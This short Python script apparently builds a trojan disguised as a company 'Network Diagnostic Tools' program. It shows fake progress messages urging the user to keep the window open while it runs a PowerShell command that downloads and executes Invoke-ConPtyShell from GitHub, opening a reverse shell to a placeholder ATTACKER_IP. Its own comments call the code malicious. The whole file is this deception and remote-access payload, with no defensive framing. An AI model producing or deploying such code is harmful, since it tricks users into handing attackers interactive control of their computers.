# https://stackoverflow.com/questions/21944895/running-powershell-script-within-python-script-how-to-make-python-print-the-pow
# may not work bcos the malicious code is powershell script
# need to find a way to run powershell script from python
import subprocess, time

def main():

    subprocess.run("echo '***** Welcome to CRAP Company Network Diagnostic Tools *****'", shell=True)
    time.sleep(2)
    subprocess.run("echo 'Please sit back and wait... we are detecting whats wrong on your device. It may take 10-15 mins.'", shell=True)
    subprocess.run("echo 'Reminder: Dont close this window! Your network will be slow again if you do so!'", shell=True)

    subprocess.run(
        "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell ATTACKER_IP PORT", 
        shell=True
    )


if __name__ == "__main__":
    main()